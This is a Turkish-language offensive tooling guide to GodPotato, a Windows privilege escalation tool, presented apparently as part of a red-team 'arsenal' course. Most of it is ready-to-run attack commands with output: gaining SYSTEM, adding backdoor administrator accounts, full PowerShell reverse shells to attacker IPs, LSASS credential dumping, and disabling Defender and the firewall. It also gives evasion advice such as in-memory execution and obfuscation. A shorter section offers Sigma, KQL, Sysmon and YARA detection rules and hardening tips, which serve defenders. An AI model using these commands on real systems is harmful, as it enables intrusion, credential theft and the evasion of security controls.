# GodPotato

> **Kategori:** [15. YEREL YETKİ YÜKSELTME (LPE) VE POTATO AİLESİ](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Windows Server 2008'den Windows Server 2022'ye kadar neredeyse tüm Windows sürümlerinde çalışan, DCOM `IStorage` arayüzü ve yerel RPC dispatching mekanizmasıyla `SeImpersonatePrivilege` yetkisini sömürerek `NT AUTHORITY\SYSTEM` seviyesine yükselen evrensel (universal) yerel yetki yükseltme aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory ortamlarında servis hesaplarının `SeImpersonatePrivilege` veya `SeAssignPrimaryTokenPrivilege` haklarını istismar eden Potato ailesi (RottenPotato, JuicyPotato, RoguePotato, SweetPotato), Microsoft'un yayınladığı güvenlik yamaları ve işletim sistemi sıkılaştırmalarıyla adım adım sınırlandırılmıştır:
* **JuicyPotato:** Windows 10 1809 ve Windows Server 2019 ile gelen yerel döngü (loopback) OXID kısıtlaması nedeniyle engellenmiştir.
* **PrintSpoofer:** Print Spooler (`spoolsv.exe`) servisine bağımlıdır; servis devre dışı bırakıldığında işlevsiz kalır.
* **RoguePotato:** Saldırganın kontrolünde olan harici bir IP adresinde sahte OXID dinleyicisi açılmasını gerektirir; katı güvenlik duvarı kuralları altında çalışmaz.

Güvenlik araştırmacısı **BeichenDream** tarafından geliştirilen **GodPotato**, bu kısıtlamaların tamamını aşarak Potato ailesinin "Evrensel (Universal)" aracı haline gelmiştir. GodPotato, Windows DCOM mimarisinde yer alan `IStorage` nesnesinin serileştirme/serileştirmeden çıkarma (marshaling/unmarshaling) sürecindeki tasarım mantığını kullanır. Araç, harici bir ağ bağlantı noktasına veya harici bir OXID sunucusuna ihtiyaç duymadan, tamamen bellek içi yerel bir sahte RPC sunucusu ayağa kaldırır. `CoGetInstanceFromFile` veya özel DCOM aktivasyon çağrıları ile `IStorage` nesnesi tetiklendiğinde, DCOM Servis Başlatıcısı (`svchost.exe -k DcomLaunch`) nesneyi doğrulamak üzere GodPotato'nun yerel RPC arayüzüne bağlanır. Bu bağlantı sırasında `NT AUTHORITY\SYSTEM` kimliğiyle gelen çağrı `RpcImpersonateClient()` API'si ile yakalanır, elde edilen belirteç (token) çoğaltılır ve istenen komut en yüksek yetkiyle çalıştırılır.

```
+---------------------------------------------------------------------------------------------------+
|                             GODPOTATO MİMARİ VE ÇALIŞMA ŞEMASI                                    |
+---------------------------------------------------------------------------------------------------+

 [ Kısıtlı Servis Oturumu (IIS, MSSQL vb.) ]
 (SeImpersonatePrivilege veya SeAssignPrimaryTokenPrivilege Aktif)
             │
             ├─► 1. Bellek İçi Sahte RPC / DCOM Dinleyicisi Başlatır
             │      (Harici Porta veya Spooler Servisine İhtiyaç Duymaz)
             │
             ├─► 2. IStorage Arayüzü İçeren Özel Serileştirilmiş COM Nesnesi Oluşturur
             │
             ├─► 3. CoGetInstanceFromFile() veya DCOM Aktivasyonunu Tetikler
             │
             ▼
 [ DCOM Sunucu Başlatıcısı (svchost.exe -k DcomLaunch / SYSTEM) ]
             │
             ├─► 4. IStorage Nesnesini Bellekten Ayrıştırmaya (Unmarshal) Başlar
             │
             ├─► 5. Nesnenin RPC Dispatcher Arayüzüne SYSTEM Bağlamında Kimlik Doğrular
             │
             ▼
 [ GodPotato RPC Yakalayıcısı ]
             │
             ├─► 6. RpcImpersonateClient() Çağrısı ile SYSTEM Token'ını Bellekte Taklit Eder
             │
             ├─► 7. DuplicateTokenEx() ile Primary Token Üretir
             │
             └─► 8. CreateProcessWithTokenW() / CreateProcessAsUserW() Tetikler
                    │
                    ▼
          [ NT AUTHORITY\SYSTEM Komut / Kabuk Yürütme Başarılı ]
```

### Neden Önemli?

| Özellik | Operasyonel Avantajı |
|:---|:---|
| **Geniş İşletim Sistemi Yelpazesi** | Windows Server 2008, 2012, 2012 R2, 2016, 2019, 2022 ve Windows 7, 8, 10, 11 üzerinde evrensel olarak çalışır. |
| **Harici Servis Bağımsızlığı** | Print Spooler (`spoolsv.exe`), BITS veya WebClient servislerinin çalışıyor olmasına ihtiyaç duymaz. |
| **Ağ / Güvenlik Duvarı Bağımsızlığı** | Dışarıya veya yerel döngü (loopback) TCP portlarına bağımlı değildir; tamamen yerel RPC bağlamında çalışır. |
| **Çoklu .NET ve AOT Desteği** | .NET Framework 2.0/3.5 (eski sistemler), .NET 4.x ve Native AOT (bağımlılıksız tek PE) sürümleri mevcuttur. |
| **Sıfır Konfigürasyon** | CLSID arama, port yönlendirme veya karmaşık parametre ayarlaması gerektirmez; tek bir komutla çalışır. |

### Potato Ailesi Karşılaştırmalı Matrisi

| Yetenek | RottenPotato | JuicyPotato | RoguePotato | PrintSpoofer | GodPotato |
|:---|:---|:---|:---|:---|:---|
| **Gereken Ayrıcalık** | SeImpersonate | SeImpersonate | SeImpersonate | SeImpersonate | SeImpersonate |
| **Win Server 2019** | ❌ Hayır | ❌ Hayır | ✅ Evet | ✅ Evet | ✅ **Evet** |
| **Win Server 2022** | ❌ Hayır | ❌ Hayır | ❌ Hayır | ✅ Evet | ✅ **Evet** |
| **Spooler Gerekir mi?**| ❌ Hayır | ❌ Hayır | ❌ Hayır | ✅ Evet (Zorunlu) | ❌ **Hayır** |
| **Harici IP / Dinleyici** | ❌ Hayır | ❌ Hayır | ✅ Evet (Zorunlu) | ❌ Hayır | ❌ **Hayır** |
| **Açık Port İhtiyacı** | ✅ Port 6666 | ✅ Port 6666 | ✅ Port 9999 | ❌ Named Pipe | ❌ **Yok (RPC Pipe)** |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

GodPotato komut satırı arayüzü operatör için azami derecede basitleştirilmiştir.

```cmd
GodPotato-NET4.exe [SEÇENEKLER]
```

### Kritik Parametreler Tablosu

| Parametre | Açıklama | Kullanım Türü | Örnek Değer |
|:---|:---|:---|:---|
| `-cmd <komut>` | `NT AUTHORITY\SYSTEM` bağlamında çalıştırılacak komut satırı veya ikili dosya yolu. | Yürütme | `-cmd "cmd.exe /c whoami"` |
| `-t <tip>` | Belirteç (token) işleme veya süreç başlatma metodu (`CreateProcessWithTokenW` için `CreateProcessWithToken`, kullanıcı süreci için `CreateProcessAsUser`). | API Seçimi | `-t CreateProcessWithToken` |
| `-p <port>` | Dahili RPC sunucusu için alternatif yerel bağlantı portu/borusu (Varsayılan otomatik oluşturulur). | Yapılandırma | `-p 8899` |
| `--help, -h` | Kullanım sözdizimini ve versiyon bilgilerini ekrana basar. | Bilgi | `-h` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Yetki Kontrolü ve Doğrulama
Web shell veya SQL enjeksiyonu oturumunda kullanıcının `SeImpersonatePrivilege` ayrıcalığı denetlenir.

```cmd
whoami /priv
```

```text
GİZLİLİK BİLGİLERİ
-------------------
Ayrıcalık Adı                 Açıklama                                    Durum
============================= =========================================== ========
SeAssignPrimaryTokenPrivilege Birincil düzey belirteci değiştir           Devre Dışı
SeIncreaseQuotaPrivilege      İşlem için bellek kotalarını ayarla         Devre Dışı
SeChangeNotifyPrivilege       Geçiş denetimini atla                       Etkin
SeImpersonatePrivilege        Kimlik doğrulamasından sonra istemciyi taklit Etkin
```

### Senaryo 2: Doğrudan SYSTEM Kimliği Doğrulama (Temel Yürütme)
Windows Server 2022 üzerinde çalışan bir IIS sunucusunda GodPotato ile `whoami` komutu yürütülür.

```cmd
C:\Windows\Temp\GodPotato-NET4.exe -cmd "cmd.exe /c whoami"
```

```text
[*] GodPotato by @BeichenDream
[*] Current user: iis apppool\defaultapppool
[*] Target OS: Windows Server 2022 (Build 20348)
[*] Starting DCOM IStorage activation...
[*] Triggering RpcImpersonateClient()...
[+] Impersonate client successfully!
[+] Got SYSTEM token (Type: Primary)
[+] Calling CreateProcessWithTokenW...
[+] Process created with PID: 4328
==================================================
nt authority\system
==================================================
```

### Senaryo 3: Arka Planda Yeni Bir Yerel Yönetici Hesabı Oluşturma
Sistemde kalıcılık sağlamak ve RDP üzerinden tam erişim elde etmek için yerel yönetici oluşturulur.

```cmd
C:\Windows\Temp\GodPotato-NET4.exe -cmd "cmd.exe /c net user backup_operator BackupP@ss2026! /add && net localgroup Administrators backup_operator /add"
```

```text
[*] GodPotato by @BeichenDream
[*] Current user: nt authority\network service
[*] Starting DCOM IStorage activation...
[+] Impersonate client successfully!
[+] Calling CreateProcessWithTokenW...
[+] Process created with PID: 5120
==================================================
Komut başarıyla tamamlandı.
Komut başarıyla tamamlandı.
==================================================
```

### Senaryo 4: PowerShell SYSTEM Ters Kabuk (Reverse Shell) Başlatma
Güvenlik duvarı dışa doğru (egress) trafiğe izin veriyorsa, saldırgan makinesindeki dinleyiciye tam yetkili bir PowerShell ters bağlantısı yönlendirilir.

```cmd
C:\Windows\Temp\GodPotato-NET4.exe -cmd "powershell.exe -nop -w hidden -c \"$client = New-Object System.Net.Sockets.TCPClient('192.168.10.50',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
```

Saldırgan dinleyici terminalindeki çıktı:
```text
listening on [any] 9001 ...
connect to [192.168.10.50] from (UNKNOWN) [192.168.10.200] 53124
PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> hostname
DC01-PROD
```

### Senaryo 5: Cobalt Strike / Havoc Üzerinden In-Memory Execute-Assembly ile GodPotato
Diske herhangi bir dosya yazmadan bellek içinde C# GodPotato ikilisi çağrılarak tespitler atlatılır.

```text
beacon> execute-assembly /opt/tools/GodPotato-NET4.exe -cmd "cmd.exe /c whoami /all"
```

```text
[*] Tasked beacon to run: GodPotato-NET4.exe -cmd "cmd.exe /c whoami /all"
[+] host called home, sent: 145620 bytes
[+] received output:
[*] GodPotato by @BeichenDream
[*] Current user: MSSQLSERVER
[*] Starting DCOM IStorage activation...
[+] Impersonate client successfully!
[+] Process created with PID: 6840
USER INFORMATION
----------------
User Name             SID
===================== ====================================================
NT AUTHORITY\SYSTEM   S-1-5-18
GROUP INFORMATION
-----------------
BUILTIN\Administrators S-1-5-32-544
```

### Senaryo 6: LSASS Belleğini SYSTEM Haklarıyla Doğrudan Dökme
LSASS koruma mekanizmalarını incelemek ve çevrimdışı hash kırma için döküm alma:

```cmd
C:\Windows\Temp\GodPotato-NET4.exe -cmd "cmd.exe /c rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 648 C:\Windows\Temp\lsass.dmp full"
```

```text
[*] GodPotato by @BeichenDream
[+] Impersonate client successfully!
[+] Calling CreateProcessWithTokenW...
[+] Process created with PID: 2984
==================================================
MiniDump completed successfully.
==================================================
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Olası Neden | Kesin Çözüm Adımı |
|:---|:---|:---|
| `[-] Can not found 'SeImpersonatePrivilege'` | Çalıştıran kullanıcının token taklit yetkisi bulunmamaktadır. | Oturum açılan kullanıcının bir servis hesabı (`IIS APPPOOL`, `MSSQLSERVER`, `LOCAL SERVICE`) olup olmadığını `whoami /priv` ile denetleyin; standart kullanıcılarda Potato araçları çalışmaz. |
| `[!] BadImageFormatException` / .NET Çalışma Hatası | Hedef sistemdeki .NET Framework sürümü ile derlenen GodPotato ikilisi uyumsuzdur. | Windows Server 2008/2012 için `GodPotato-NET2.exe` veya `GodPotato-NET35.exe`, Windows Server 2016-2022 için `GodPotato-NET4.exe` derlemesini kullanın. |
| `[-] CreateProcessWithTokenW error: 1314` | Belirteçte `SeAssignPrimaryTokenPrivilege` eksik olduğu için `CreateProcessWithTokenW` çağrısı reddedilmiştir. | Komut satırına `-t CreateProcessAsUser` parametresini ekleyerek birincil kullanıcı oluşturma API'sini tetikleyin. |
| `[-] CoCreateInstance or CoGetInstanceFromFile failed: 0x80070005` | DCOM başlatma izinleri GPO veya EDR tarafından kısıtlanmıştır. | DCOM izinlerini inceleyin; alternatif olarak Print Spooler açık ise `PrintSpoofer` aracına geçiş yapın. |
| Komut yürütülüyor ancak ekranda hiçbir çıktı görünmüyor | Süreç interaktif olmayan bir oturumda (Session 0) tamamlanmış veya standart çıktı akışı yakalanamamıştır. | Çıktıyı dosyaya yönlendirin (`-cmd "cmd.exe /c whoami > C:\temp\result.txt"`) veya bir ters kabuk payload'u ile doğrudan bağlantı açın. |
| `Access Denied (0x5)` / Antivirus Engellemesi | Windows Defender veya EDR, GodPotato'nun statik imzasını yakalayarak yürütmeyi durdurmuştur. | Binary'yi doğrudan diske bırakmak yerine `execute-assembly` ile bellekten çalıştırın ya da C# kaynak kodunu karıştırarak (obfuscation) yeniden derleyin. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
+---------------------------------------------------------------------------------------------------+
|                                GODPOTATO TESPİT VE GÖZLEMLENEBİLİRLİK                             |
+---------------------------------------------------------------------------------------------------+

 [ DCOM Aktivasyonu & IStorage Serileştirme ]
  - svchost.exe (DcomLaunch) Tetiklenmesi ====> Sysmon Event ID 1 (DCOM Süreç Başlatma)
  - Anormal Bellek İçi COM Çağrıları

 [ Yerel RPC Etkileşimi ]
  - Yerel Dinleyiciye SYSTEM Bağlantısı  ====> Ağ Taraması Yok (Tamamen Host İçi RPC)
  - RpcImpersonateClient() Çağrısı       ====> EDR Davranışsal Analizi (Token Theft)

 [ Süreç Başlatma & Token Manipülasyonu ]
  - Parent: w3wp.exe/sqlservr.exe        ====> Sysmon Event ID 1 (Parent-Child Anomalisi)
  - Child: cmd.exe / powershell.exe (SYSTEM)
  - Windows Security Event ID 4624/4672  ====> Özel Hak Ataması (SeDebug, SeTcb)
```

### 5.1 Bırakılan İzler ve Windows Olay Günlükleri
* **Sysmon Event ID 1 (Process Creation):** Servis süreçlerinin (`w3wp.exe`, `sqlservr.exe`, `tomcat.exe`) alt süreç olarak `cmd.exe` veya `powershell.exe` türetmesi ve bu yeni sürecin `NT AUTHORITY\SYSTEM` kimliğine sahip olması en kritik IOC'dir.
* **Windows Security Event ID 4624 (Successful Logon):** `NT AUTHORITY\SYSTEM` güvenlik bağlamında Logon Type 2 veya Type 9 (NewCredentials) ile oturum açılması.
* **Windows Security Event ID 4672 (Special Privileges Assigned):** Yeni oluşturulan sürece en yüksek düzey Windows ayrıcalıklarının (`SeDebugPrivilege`, `SeTcbPrivilege`, `SeImpersonatePrivilege`) atanması.

### 5.2 Ağ ve EDR İmzaları
* GodPotato ağ kartı (NIC) üzerinden harici hiçbir paket göndermez; tüm sömürü yerel bellek ve RPC mimarisinde gerçekleşir.
* Gelişmiş EDR sistemleri (Microsoft Defender for Endpoint, CrowdStrike Falcon), `DuplicateTokenEx` çağrısı sonrasında bir servis hesabından türeyen SYSTEM süreçlerini şüpheli token çalma (token kidnapping) davranışı olarak alarmlar.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Taktik | Teknik ID | Teknik Adı | Kullanım Amacı |
|:---|:---|:---|:---|
| **Privilege Escalation** | `T1134.001` | Access Token Manipulation: Token Impersonation/Theft | DCOM `IStorage` üzerinden SYSTEM belirtecinin ele geçirilmesi. |
| **Privilege Escalation** | `T1134.002` | Create Process with Token | `CreateProcessWithTokenW` ile SYSTEM yetkisinde alt süreç oluşturma. |
| **Privilege Escalation** | `T1068` | Exploitation for Privilege Escalation | DCOM IStorage serileştirme zafiyetini yerel yükselme için kullanma. |
| **Execution** | `T1059.003` | Command and Scripting Interpreter: Windows Command Shell | Elde edilen yetkili bağlamda komut satırı yürütme. |

### 5.4 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Risk Seviyesi | Operasyonel Önlem / Kaçınma Yöntemi |
|:---|:---|:---|
| Standart PE Dosyası İmzası | **KRİTİK** | GitHub release PE ikilisini diske yazmayın. Bellek içi yükleyici (`execute-assembly`) veya C# kaynak kodunu karıştırarak (ConfuserEx) derleyin. |
| Şüpheli Alt Süreç Türetimi | **YÜKSEK** | Doğrudan `cmd.exe` veya `powershell.exe` çağırmak yerine, meşru bir Windows ikilisini (LOLBin) çağırın veya süreç içi thread enjeksiyonu yapın. |
| Komut Satırı Argümanları | **ORTA** | `-cmd` içinde açık metin zararlı komutlar göndermek yerine Base64 ile encode edilmiş scriptler tercih edin. |

### 5.5 Tespit Kuralı Örnekleri (Sigma & KQL)

#### Sigma Kuralı (DCOM IStorage Servis Anomali Tespiti):
```yaml
title: GodPotato Privilege Escalation Detection
id: 3c9b74f1-9d2a-4a57-8e62-c1f0984a912a
status: production
description: Detects process creation patterns originating from service accounts elevating to SYSTEM via GodPotato.
logsource:
  category: process_creation
  product: windows
detection:
  selection_parent:
    ParentImage|endswith:
      - '\w3wp.exe'
      - '\sqlservr.exe'
      - '\tomcat9.exe'
  selection_child:
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
  selection_user:
    User|contains: 'SYSTEM'
  condition: selection_parent and selection_child and selection_user
level: critical
```

#### Microsoft Sentinel KQL Sorgusu:
```kusto
SecurityEvent
| where EventID == 4688
| where ProcessCommandLine has_any ("GodPotato", "GodPotato-NET4") or 
        (ParentProcessName has_any ("w3wp.exe", "sqlservr.exe") and TargetUserName == "SYSTEM" and NewProcessName has_any ("cmd.exe", "powershell.exe"))
| project TimeGenerated, Computer, SubjectUserName, TargetUserName, ParentProcessName, NewProcessName, CommandLine
```

#### Sysmon XML Yapılandırma Kuralı:
```xml
<!-- Sysmon Event ID 1: Servis Süreçlerinden SYSTEM Yetkisinde Çocuk Süreç Türetimi -->
<Sysmon schemaversion="4.50">
  <EventFiltering>
    <RuleGroup name="GodPotato Mitigation" groupRelation="or">
      <ProcessCreate onmatch="include">
        <ParentImage condition="end with">\w3wp.exe</ParentImage>
        <ParentImage condition="end with">\sqlservr.exe</ParentImage>
        <IntegrityLevel condition="is">System</IntegrityLevel>
      </ProcessCreate>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

#### Incident Response (IR) PowerShell Analiz Betiği:
```powershell
# Olay günlüklerinde servis hesaplarının SYSTEM olarak başlattığı şüpheli komutları sorgulama
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} -MaxEvents 200 | Where-Object {
    $_.Message -match "Account Name:\s+NT AUTHORITY\\SYSTEM" -and 
    $_.Message -match "Creator Process Name:\s+.*(w3wp|sqlservr)\.exe"
} | Select-Object TimeCreated, @{N='Detail';E={$_.Message}}
```

#### YARA Kuralı (Statik İkili Tespiti):
```yara
rule HackTool_MSIL_GodPotato_Strings {
    meta:
        description = "Detects GodPotato universal privilege escalation tool"
        author = "RedTeam SecOps"
        date = "2026-10-14"
        reference = "https://github.com/BeichenDream/GodPotato"
    strings:
        $s1 = "GodPotato" ascii wide
        $s2 = "CoGetInstanceFromFile" ascii wide
        $s3 = "CreateProcessWithTokenW" ascii wide
        $s4 = "RpcImpersonateClient" ascii wide
        $s5 = "SeImpersonatePrivilege" ascii wide
        $s6 = "IStorage" ascii wide
    condition:
        uint16(0) == 0x5A4D and 4 of ($s*)
}
```

### 5.6 Savunma Karşılığı ve Sertleştirme
* **Servis Hesaplarını Sanallaştırma:** IIS uygulama havuzlarında ve MSSQL servislerinde varsayılan olarak `LocalSystem` veya `NetworkService` yerine izole sanal hesaplar (Virtual Accounts) ya da gMSA kullanılmalıdır.
* **GPO ile Kullanıcı Hakları Atamasını İnceleme:** Etki alanı genelinde `SeImpersonatePrivilege` yetkisinin yalnızca yetkili servis hesaplarına verilmesi sağlanmalı, düzenli denetim yapılmalıdır.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

#### 1. Temel SYSTEM Kimliği Doğrulama
```cmd
GodPotato-NET4.exe -cmd "cmd.exe /c whoami"
```
* **Ne Yapar?:** Enjekte edilen DCOM çağrısıyla doğrudan SYSTEM kimliğiyle `whoami` çalıştırır.
* **Ne Zaman Kullanılır?:** Sistemin zafiyetten etkilendiğini ve aracın çalıştığını doğrulamak için.
* **Parametreler:** `-cmd "cmd.exe /c whoami"`.

#### 2. Tüm Kullanıcı Ayrıcalıklarını Dökme
```cmd
GodPotato-NET4.exe -cmd "cmd.exe /c whoami /all"
```
* **Ne Yapar?:** Elde edilen SYSTEM token'ının tüm SID, grup ve ayrıcalık listesini görüntüler.
* **Ne Zaman Kullanılır?:** Yetki yükseltme sonrası tam izin setini teyit etmek için.
* **Parametreler:** `-cmd "cmd.exe /c whoami /all"`.

#### 3. Yeni Yerel Yönetici Hesabı Ekleme
```cmd
GodPotato-NET4.exe -cmd "cmd.exe /c net user adm_sec P@ssword2026! /add && net localgroup administrators adm_sec /add"
```
* **Ne Yapar?:** Arka planda kalıcı bir yerel yönetici kullanıcısı tanımlar.
* **Ne Zaman Kullanılır?:** GUI (RDP) veya WinRM ile doğrudan yönetici girişi sağlamak için.
* **Parametreler:** `-cmd <komutlar_zinciri>`.

#### 4. SYSTEM Haklarıyla PowerShell Ters Bağlantı Fırlatma
```cmd
GodPotato-NET4.exe -cmd "powershell.exe -nop -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('10.10.14.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=[Text.Encoding]::ASCII.GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()\""
```
* **Ne Yapar?:** Dinleyici IP'sine tam yetkili PowerShell etkileşimli kabuğu açar.
* **Ne Zaman Kullanılır?:** Terminal etkileşimi kurulamayan web shell kısıtlarını aşmak için.
* **Parametreler:** `-cmd <powershell_payload>`.

#### 5. CreateProcessAsUser API'sini Zorlama
```cmd
GodPotato-NET4.exe -t CreateProcessAsUser -cmd "cmd.exe /c whoami"
```
* **Ne Yapar?:** Süreç oluşturma işlemini `CreateProcessAsUserW` API'si üzerinden gerçekleştirir.
* **Ne Zaman Kullanılır?:** `CreateProcessWithTokenW` çağrısı kısıtlandığında veya hata (1314) verdiğinde.
* **Parametreler:** `-t CreateProcessAsUser`.

#### 6. Komut Çıktısını Diske Yazdırma
```cmd
GodPotato-NET4.exe -cmd "cmd.exe /c ipconfig /all > C:\Windows\Temp\network_info.txt"
```
* **Ne Yapar?:** Hedef makinenin tüm ağ arabirimlerini ve DNS ayarlarını dosyaya yazar.
* **Ne Zaman Kullanılır?:** Kör (blind) RCE senaryolarında çıktıları incelemek için.
* **Parametreler:** `cmd.exe /c ... > dosya`.

#### 7. Windows Defender Korumasını Devre Dışı Bırakma
```cmd
GodPotato-NET4.exe -cmd "powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring $true"
```
* **Ne Yapar?:** SYSTEM haklarıyla Windows Defender gerçek zamanlı korumasını durdurur.
* **Ne Zaman Kullanılır?:** Mimikatz ve benzeri araçların engellenmesini önlemek için.
* **Parametreler:** `Set-MpPreference -DisableRealtimeMonitoring $true`.

#### 8. LSASS Belleğini Comsvcs.dll ile Dökme
```cmd
GodPotato-NET4.exe -cmd "cmd.exe /c powershell.exe -c \"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Windows\Temp\lsass.dmp full\""
```
* **Ne Yapar?:** LSASS sürecinin tam bellek dökümünü mini-dump formatında alır.
* **Ne Zaman Kullanılır?:** Bellekteki NTLM hash ve biletleri offline analiz etmek için.
* **Parametreler:** `rundll32 comsvcs.dll MiniDump`.

#### 9. Windows Güvenlik Duvarını Kapatma
```cmd
GodPotato-NET4.exe -cmd "netsh advfirewall set allprofiles state off"
```
* **Ne Yapar?:** Tüm yerel güvenlik duvarı kurallarını pasife çeker.
* **Ne Zaman Kullanılır?:** Yanal hareket (lateral movement) öncesi port engellerini kaldırmak için.
* **Parametreler:** `netsh advfirewall set allprofiles state off`.

#### 10. Eski .NET 2.0 / 3.5 Sürümü ile Çalıştırma
```cmd
GodPotato-NET2.exe -cmd "cmd.exe /c whoami"
```
* **Ne Yapar?:** Windows Server 2008 ve 2012 sistemlerde .NET 2.0/3.5 motoru ile yetki yükseltir.
* **Ne Zaman Kullanılır?:** Modern .NET 4.x kütüphanelerinin bulunmadığı eski kurumsal sunucularda.
* **Parametreler:** `GodPotato-NET2.exe -cmd ...`.

---

## Kaynaklar

* [BeichenDream Resmi GitHub Deposu: GodPotato](https://github.com/BeichenDream/GodPotato)
* [BeichenDream Araştırma Dokümanı ve Makalesi](https://github.com/BeichenDream/GodPotato/blob/main/README.md)
* [Microsoft Dokümantasyonu: [MS-DCOM] Distributed Component Object Model](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/)
* [The Hacker Recipes: Abusing Tokens and Impersonation](https://www.thehacker.recipes/a-d/movement/privilege-escalation/impersonation)
* [HackTricks: Windows Local Privilege Escalation - Impersonation Privileges](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html)
* [MITRE ATT&CK: Access Token Manipulation (T1134)](https://attack.mitre.org/techniques/T1134/)

---

> **Önceki:** [← SweetPotato / JuicyPotatoNG](./SweetPotato_JuicyPotatoNG.md) · **Sonraki:** [Chisel (Kategori 16) →](../Kategori_16_Tunelleme_Pivot_ve_SOCKS_Proxy/Chisel.md)
